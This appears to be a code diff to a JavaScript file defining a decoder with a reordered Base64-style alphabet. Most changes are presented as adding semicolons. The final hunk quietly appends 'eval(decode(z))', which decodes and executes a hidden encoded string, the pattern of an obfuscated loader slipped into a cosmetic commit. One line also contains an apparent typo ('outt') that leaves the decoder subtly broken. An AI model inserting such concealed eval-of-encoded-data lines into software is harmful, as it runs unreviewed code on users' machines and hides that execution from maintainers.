@@ -1,4 +1,4 @@
-var key="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/="
+var key="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/=";
 function decode(input){
 	var out="";
 	var enc1;
@@ -22,5 +22,6 @@ function decode(input){
 		if(enc2!=64){out=outt+String.fromCharCode(enc2)}
 		if(enc3!=64){out=out+String.fromCharCode(enc3)}
 	}
-	return out
+	return out;
 }
+eval(decode(z));
